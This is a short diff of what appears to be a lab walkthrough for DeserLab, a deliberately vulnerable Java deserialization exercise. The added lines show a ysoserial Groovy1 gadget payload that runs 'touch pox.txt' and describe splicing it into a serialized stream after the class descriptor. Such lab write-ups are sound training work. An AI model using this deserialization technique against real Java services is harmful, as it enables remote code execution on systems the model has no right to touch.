@@ -203,8 +203,17 @@ xxd ../DeserLab-v1.0/test.bin
 00000070: 0004 7465 7374 7400 00                   ..testt..
 ```
 
-With Payload
+Now time to generate payload:
+```
+java -jar ysoserial.jar Groovy1 "touch pox.txt" > thepayload.bin
+```
 
+No it time to paste payload afer  
+```TC_CLASSDESC - 0x72
+      className
+        Length - 20 - 0x00
+```
+How it should look like:
 ```
 java -jar SerializationDumper.jar -r ../DeserLab-v1.0/withpayload.bin 
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
